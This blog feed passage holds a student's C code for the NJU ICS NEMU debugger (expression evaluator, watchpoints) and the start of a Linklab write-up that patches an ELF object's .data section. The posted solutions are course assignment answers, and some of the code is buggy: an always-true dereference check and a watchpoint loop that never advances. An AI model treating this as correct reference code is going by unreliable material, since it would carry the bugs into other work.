TK_NOTYPE&#125;,  <span class="comment">// spaces</span></span><br><span class="line">    &#123;<span class="string">&quot;\\+&quot;</span>, TK_ADD&#125;,  <span class="comment">// plus第一个/是为了转义c语言，第二个/是为了转义正则</span></span><br><span class="line">    &#123;<span class="string">&quot;-&quot;</span>, TK_SUB&#125;,      &#123;<span class="string">&quot;\\*&quot;</span>, TK_MUL&#125;,   &#123;<span class="string">&quot;/&quot;</span>, TK_DIV&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;\\(&quot;</span>, TK_BRAL&#125;,   &#123;<span class="string">&quot;\\)&quot;</span>, TK_BRAR&#125;,  &#123;<span class="string">&quot;==&quot;</span>, TK_EQ&#125;,  <span class="comment">// equal</span></span><br><span class="line">    &#123;<span class="string">&quot;\\$[a-z]+&quot;</span>, TK_REG&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* <span class="doctag">TODO:</span> Now a new token is recognized with rules[i]. Add codes</span></span><br><span class="line"><span class="comment">                 * to record the token in the array `tokens&#x27;. For certain types</span></span><br><span class="line"><span class="comment">                 * of tokens, some extra actions should be performed.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (rules[i].token_type) &#123;</span><br><span class="line">    <span class="keyword">case</span> TK_NOTYPE:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TK_EQ:</span><br><span class="line">    <span class="keyword">case</span> TK_DEC:</span><br><span class="line">    <span class="keyword">case</span> TK_ADD:</span><br><span class="line">    <span class="keyword">case</span> TK_SUB:</span><br><span class="line">    <span class="keyword">case</span> TK_MUL:</span><br><span class="line">    <span class="keyword">case</span> TK_DIV:</span><br><span class="line">    <span class="keyword">case</span> TK_BRAL:</span><br><span class="line">    <span class="keyword">case</span> TK_BRAR:</span><br><span class="line">    <span class="keyword">case</span> TK_HEX:</span><br><span class="line">    <span class="keyword">case</span> TK_REG:</span><br><span class="line">        tokens[nr_token].type = rules[i].token_type;</span><br><span class="line">        <span class="built_in">strncpy</span>(tokens[nr_token].str, substr_start, substr_len);</span><br><span class="line">        tokens[nr_token].str[substr_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        nr_token++;</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检测是否被括号包围</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">check_parentheses</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bracket = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (tokens[start].type == TK_BRAL &amp;&amp; tokens[end].type == TK_BRAR) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt;= end; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tokens[i].type == TK_BRAL) &#123;</span><br><span class="line">                bracket++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tokens[i].type == TK_BRAR) &#123;</span><br><span class="line">                bracket--;</span><br><span class="line">                <span class="keyword">if</span> (i != end &amp;&amp; <span class="number">0</span> == bracket) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == bracket) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检测括号是否表达式</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">check_exp_is_valid</span><span class="params">(<span class="type">int</span> start,<span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bracket = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt;= end; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tokens[i].type == TK_BRAL) &#123;</span><br><span class="line">            bracket++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tokens[i].type == TK_BRAR) &#123;</span><br><span class="line">            bracket--;</span><br><span class="line">            <span class="keyword">if</span> (bracket &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//找出主运算符</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">principal_operator</span><span class="params">(<span class="type">int</span> start,<span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bracket=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> operator= <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> is_add_or_sub=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=start; i&lt;=end; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tokens[i].type == TK_BRAL) &#123;</span><br><span class="line">            bracket++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(tokens[i].type==TK_BRAR)&#123;</span><br><span class="line">            bracket--;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span>==bracket) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tokens[i].type == TK_ADD || tokens[i].type == TK_SUB) &#123;</span><br><span class="line">                operator=i;</span><br><span class="line">                is_add_or_sub=<span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="literal">false</span> == is_add_or_sub &amp;&amp;</span><br><span class="line">                       (tokens[i].type == TK_DIV || tokens[i].type == TK_MUL||tokens[i].type ==TK_DEREF||tokens[i].type==TK_REG)) &#123;<span class="comment">//应该把优先级最高的放后面</span></span><br><span class="line">                operator=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> operator;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> answer_valid=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">//递归求值</span></span><br><span class="line"><span class="type">static</span> <span class="type">int32_t</span> <span class="title function_">eval</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (start == end) &#123;</span><br><span class="line">        <span class="keyword">if</span>(tokens[start].type==TK_DEC)</span><br><span class="line">            <span class="keyword">return</span> atoi(tokens[start].str);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(tokens[start].type==TK_HEX)</span><br><span class="line">            <span class="keyword">return</span> strtol(tokens[start].str,<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (tokens[start].type==TK_REG) &#123;</span><br><span class="line">           <span class="type">int</span> res= isa_reg_str2val(tokens[start].str,&amp;answer_valid);</span><br><span class="line">           <span class="keyword">if</span> (!answer_valid) &#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;reg exp error&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="literal">true</span> == check_parentheses(start, end)) &#123;</span><br><span class="line">        <span class="keyword">return</span> eval(start+<span class="number">1</span>,end<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (check_exp_is_valid(start,end)==<span class="literal">false</span>) &#123;<span class="comment">//check_parentheses返回false有两种情况，一种是没有被括号包围但表表达式正确，另一种是表达式就不对</span></span><br><span class="line">            answer_valid=<span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//这里不会有太多无意义的性能消耗，第一次就会被检测出来</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> operator=principal_operator(start, end);</span><br><span class="line">        <span class="keyword">if</span> (tokens[operator].type==TK_DEREF) &#123;</span><br><span class="line">            <span class="keyword">return</span> vaddr_read(strtoul(tokens[operator+<span class="number">1</span>].str,<span class="literal">NULL</span>,<span class="number">16</span>),<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int32_t</span> sum1=eval(start,operator<span class="number">-1</span>);</span><br><span class="line">        <span class="type">int32_t</span> sum2=eval(operator+<span class="number">1</span>,end);</span><br><span class="line">        <span class="keyword">switch</span> (tokens[operator].type) &#123;</span><br><span class="line">            <span class="keyword">case</span> TK_ADD:</span><br><span class="line">                <span class="keyword">return</span> sum1 + sum2;</span><br><span class="line">            <span class="keyword">case</span> TK_SUB:</span><br><span class="line">                <span class="keyword">return</span> sum1 - sum2;</span><br><span class="line">            <span class="keyword">case</span> TK_MUL:</span><br><span class="line">                <span class="keyword">return</span> sum1 * sum2;</span><br><span class="line">            <span class="keyword">case</span> TK_DIV:</span><br><span class="line">                <span class="keyword">return</span> sum1 / sum2;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int32_t</span> <span class="title function_">expr</span><span class="params">(<span class="type">char</span> *e, <span class="type">bool</span> *success)</span> &#123;</span><br><span class="line">    answer_valid=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!make_token(e)) &#123;</span><br><span class="line">        *success = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;=nr_token<span class="number">-1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tokens[i].type == TK_MUL &amp;&amp;</span><br><span class="line">            (i == <span class="number">0</span> ||</span><br><span class="line">             (tokens[i - <span class="number">1</span>].type != TK_DEC || tokens[i - <span class="number">1</span>].type != TK_BRAL ||</span><br><span class="line">              tokens[i - <span class="number">1</span>].type != TK_HEX))) &#123;</span><br><span class="line">                tokens[i].type =TK_DEREF;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> Insert codes to evaluate the expression. */</span></span><br><span class="line">    <span class="type">int32_t</span> answer=eval(<span class="number">0</span>,nr_token<span class="number">-1</span>);</span><br><span class="line">    *success=answer_valid;</span><br><span class="line">    <span class="keyword">return</span> answer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_p</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">    <span class="type">bool</span> flag=<span class="literal">true</span>;</span><br><span class="line">    <span class="type">int32_t</span> answer = expr(args, &amp;flag);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span>==flag) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error expression&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s: %d 0x%x\n&quot;</span>,args,answer,answer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="监视点"><a href="#监视点" class="headerlink" title="监视点"></a>监视点</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> NO;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* <span class="doctag">TODO:</span> Add more members if necessary */</span></span><br><span class="line">  <span class="type">sword_t</span> value;</span><br><span class="line">  <span class="type">char</span> expr[<span class="number">32</span>];</span><br><span class="line">&#125; WP;</span><br><span class="line">WP* <span class="title function_">new_wp</span><span class="params">(<span class="type">int32_t</span> value,<span class="type">char</span> *expr)</span>; </span><br><span class="line"><span class="type">void</span> <span class="title function_">free_wp</span><span class="params">(WP *wp)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">check_wp</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dispaly_wp</span><span class="params">()</span>;</span><br><span class="line">WP* <span class="title function_">get_wp</span><span class="params">(<span class="type">char</span>* s)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">init_wp_pool</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_WP; i ++) &#123;</span><br><span class="line">    wp_pool[i].NO = i;</span><br><span class="line">    wp_pool[i].next = &amp;wp_pool[i + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(wp_pool[i].expr, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  wp_pool[NR_WP - <span class="number">1</span>].next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  head = <span class="literal">NULL</span>;</span><br><span class="line">  free_ = wp_pool;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* <span class="doctag">TODO:</span> Implement the functionality of watchpoint */</span></span><br><span class="line">WP* <span class="title function_">new_wp</span><span class="params">(<span class="type">int32_t</span> value,<span class="type">char</span> *expr)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span>==free_) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Dont hava free watch pointer&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    WP* temp = free_;</span><br><span class="line">    free_=free_-&gt;next;</span><br><span class="line">    temp-&gt;next = head;</span><br><span class="line">    head = temp;</span><br><span class="line">    head-&gt;value=value;</span><br><span class="line">    <span class="built_in">memcpy</span>(head-&gt;expr,expr,<span class="built_in">strlen</span>(expr));</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">free_wp</span><span class="params">(WP* wp)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!wp) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;dont have this watch pointer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (wp==head) &#123;</span><br><span class="line">        head =head-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      WP *temp=head;</span><br><span class="line">     <span class="keyword">while</span> (temp !=<span class="literal">NULL</span> &amp;&amp;temp-&gt;next!=wp) &#123;</span><br><span class="line">      temp=temp-&gt;next;</span><br><span class="line">     &#125;</span><br><span class="line">     temp-&gt;next=temp-&gt;next-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    wp-&gt;next=free_;</span><br><span class="line">    free_=wp;</span><br><span class="line">    wp-&gt;value = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(wp-&gt;expr, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">check_wp</span><span class="params">()</span> &#123;</span><br><span class="line">    WP* temp=head;</span><br><span class="line">    <span class="type">bool</span> equal=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="type">word_t</span> new_value=expr(temp-&gt;expr,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(new_value!=temp-&gt;value) &#123; </span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Num:%d  Expr:%s  at:%x\n&quot;</span>,temp-&gt;NO,temp-&gt;expr,temp-&gt;value);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;old value = 0x%x\nnew value = 0x%x\n&quot;</span>,temp-&gt;value,new_value);</span><br><span class="line">          equal = <span class="literal">false</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> equal;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dispaly_wp</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span>==head) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No watchpoints.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    WP* temp = head;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Num\tWhat\t&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (temp!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\t0x%x\t\n&quot;</span>,temp-&gt;NO,temp-&gt;value);</span><br><span class="line">          temp=temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">WP* <span class="title function_">get_wp</span><span class="params">(<span class="type">char</span>* s)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (wp_pool + atoi(s));  <span class="comment">// wp_pool为WP*类型，所以他+n=(char *)wp_pool+sizeof(WP)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_w</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="type">bool</span> flag;</span><br><span class="line">    WP* temp= new_wp(expr(args,&amp;flag),args);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> == flag) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error expression in watch&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;watch pointer at 0x%x\n&quot;</span>, temp-&gt;value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;NOT ON DEBUG PATTERN&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cpu-exec.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">    asm_print(this_pc, seq_pc - this_pc, n &lt; MAX_INSTR_TO_PRINT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> check watchpoints here. */</span></span><br><span class="line">    <span class="keyword">if</span> (check_wp()) &#123;</span><br><span class="line">     nemu_state.state=NEMU_STOP; </span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="info-w"><a href="#info-w" class="headerlink" title="info w"></a>info w</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_info</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">strncmp</span>(<span class="string">&quot;r&quot;</span>, args, <span class="number">1</span>)) &#123;</span><br><span class="line">    isa_reg_display();</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">strncmp</span>(<span class="string">&quot;w&quot;</span>, args, <span class="number">1</span>)) &#123;</span><br><span class="line">    dispaly_wp();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="d-NUM"><a href="#d-NUM" class="headerlink" title="d NUM"></a>d NUM</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_d</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  WP * temp=get_wp(args);</span><br><span class="line">  free_wp(temp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调试器所有command"><a href="#调试器所有command" class="headerlink" title="调试器所有command"></a>调试器所有command</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">char</span> *description;</span><br><span class="line">  <span class="type">int</span> (*handler)(<span class="type">char</span> *);</span><br><span class="line">&#125; cmd_table[] = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;help&quot;</span>, <span class="string">&quot;Display informations about all supported commands&quot;</span>, cmd_help&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;c&quot;</span>, <span class="string">&quot;Continue the execution of the program&quot;</span>, cmd_c&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;q&quot;</span>, <span class="string">&quot;Exit NEMU&quot;</span>, cmd_q&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;si&quot;</span>, <span class="string">&quot;Single Instruction&quot;</span>, cmd_si&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;info&quot;</span>, <span class="string">&quot;info reg or watch&quot;</span>, cmd_info&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;x&quot;</span>, <span class="string">&quot;show memcory info&quot;</span>, cmd_x&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;p&quot;</span>, <span class="string">&quot;pppp&quot;</span>, cmd_p&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;watch&quot;</span>, <span class="string">&quot;watch a point&quot;</span>, cmd_w&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;d&quot;</span>,<span class="string">&quot;delete a watch pointer&quot;</span>,cmd_d&#125;</span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> Add more commands */</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> NEMU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJU ICS4 Linklab</title>
      <link href="/2023/05/08/ics4-linklab/"/>
      <url>/2023/05/08/ics4-linklab/</url>
      
        <content type="html"><![CDATA[<h1 id="NJU-ICS4-Linklab"><a href="#NJU-ICS4-Linklab" class="headerlink" title="NJU ICS4 Linklab"></a>NJU ICS4 Linklab</h1><p>mooc上的好像是阉割版，作为一个被pwn噶过腰子的男人(bu shi)，怎么能放过这种hack性质的lab，就去找了貌似是完整的lab:)</p><p>链接：<a href="https://pan.baidu.com/s/1_tPhDGhKaF4HZ94oayqnMw">https://pan.baidu.com/s/1_tPhDGhKaF4HZ94oayqnMw</a><br>提取码：fbex</p><p>实验文件都是x86-32的</p><p>阶段 1：静态数据对象与 ELF 数据节<br>阶段 2：指令与 ELF 代码节<br>阶段 3：符号解析<br>阶段 4：switch 语句与重定位<br>阶段 5：可重定位目标文件<br>阶段 6：位置无关代码（Position-Independent Code，PIC）</p><h2 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main) [<span class="number">1</span>]&gt; gcc -m32 -no-pie -o linkbomb main.o phase1.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">ddURHzFnm2mcxbehqVcVufpd68LdEePs        lYPCnZfPLLbMLzV3iM1A97QVLg7j8zcmDlD0clCtKV0kgLRshaBQ3kCaGG YMbr9ELE31xt2fau4zX7bEMCVf   qXOdnQ igVJcDsac1d9N7kSla5VLXAKDtjxAoNjW2tonwDzyASqLn5JKSf32EqapXP83B03NmDqUx</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; objdump -d phase1.o</span><br><span class="line"></span><br><span class="line">phase1.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;do_phase&gt;:</span><br><span class="line">   <span class="number">0</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line">   <span class="number">1</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line">   <span class="number">3</span>:   <span class="number">83</span> ec <span class="number">08</span>                sub    $<span class="number">0x8</span>,%esp</span><br><span class="line">   <span class="number">6</span>:   b8 <span class="number">9</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x9a</span>,%eax</span><br><span class="line">   b:   <span class="number">83</span> ec <span class="number">0</span>c                sub    $<span class="number">0xc</span>,%esp</span><br><span class="line">   e:   <span class="number">50</span>                      push   %eax</span><br><span class="line">   f:   e8 fc ff ff ff          call   <span class="number">10</span> &lt;do_phase+<span class="number">0x10</span>&gt;</span><br><span class="line">  <span class="number">14</span>:   <span class="number">83</span> c4 <span class="number">10</span>                add    $<span class="number">0x10</span>,%esp</span><br><span class="line">  <span class="number">17</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">18</span>:   c9                      leave</span><br><span class="line">  <span class="number">19</span>:   c3                      ret</span><br><span class="line">      </span><br><span class="line"> grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase1.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x354</span> contains <span class="number">2</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000007</span>  <span class="number">00000301</span> R_386_32          <span class="number">00000000</span>   .data</span><br><span class="line"><span class="number">00000010</span>  <span class="number">00000e02</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br></pre></td></tr></table></figure><p>.rel.text给text做重定位，offset 10处为puts，所以0x9a处的数据压栈做puts参数，这里猜测就是.data的偏移了</p><p><img src="/2023/05/08/ics4-linklab/image-20230506171613189.png" alt="image-20230506171613189"></p><p>直接改掉</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase1.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">grxer</span><br></pre></td></tr></table></figure><h2 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000061</span> &lt;kfSvKnbh&gt;:</span><br><span class="line">  <span class="number">61</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line">  <span class="number">62</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line">  <span class="number">64</span>:   <span class="number">83</span> ec <span class="number">08</span>                sub    $<span class="number">0x8</span>,%esp</span><br><span class="line">  <span class="number">67</span>:   <span class="number">83</span> ec <span class="number">08</span>                sub    $<span class="number">0x8</span>,%esp</span><br><span class="line">  <span class="number">6</span>a:   <span class="number">68</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   $<span class="number">0x2</span></span><br><span class="line">  <span class="number">6f</span>:   ff <span class="number">75</span> <span class="number">08</span>                push   <span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">72</span>:   e8 fc ff ff ff          call   <span class="number">73</span> &lt;kfSvKnbh+<span class="number">0x12</span>&gt;</span><br><span class="line">  <span class="number">77</span>:   <span class="number">83</span> c4 <span class="number">10</span>                add    $<span class="number">0x10</span>,%esp</span><br><span class="line">  <span class="number">7</span>a:   <span class="number">85</span> c0                   test   %eax,%eax</span><br><span class="line">  <span class="number">7</span>c:   <span class="number">75</span> <span class="number">10</span>                   jne    <span class="number">8</span>e &lt;kfSvKnbh+<span class="number">0x2d</span>&gt;</span><br><span class="line">  <span class="number">7</span>e:   <span class="number">83</span> ec <span class="number">0</span>c                sub    $<span 